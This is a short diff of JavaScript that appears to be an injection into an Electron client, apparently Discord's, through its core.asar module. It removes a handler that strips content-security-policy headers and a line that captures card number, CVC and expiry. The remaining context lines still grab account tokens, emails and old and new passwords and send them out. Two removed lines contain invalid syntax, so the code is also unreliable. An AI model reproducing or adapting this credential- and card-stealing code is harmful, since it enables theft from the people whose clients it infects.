@@ -83,16 +83,10 @@ session.defaultSession.webRequest.onBeforeRequest({
     });
 })
 
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    delete details.responseHeaders.['content-security-policy'];
-    delete details.responseHeaders.['content-security-policy-report-only'];
-    callback({
-        'responseHeaders': {
-            ...details.responseHeaders,
-            'Access-Control-Allow-Headers': '*'
-        }
-    });
-});
+
+        
+    
+
 
 function sendToApi(data) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -181,5 +175,5 @@ session.defaultSession.webRequest.onCompleted({
         if (data['email']) newData('changedEmail', token, data['email'], data['password']);
         if (data['new_password']) newData('changedPassword', token, data['password'], data['new_password']);
     }
-    if (details.url.endsWith.('tokens')) newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']);
+    
 }), module.exports = require('./core.asar');
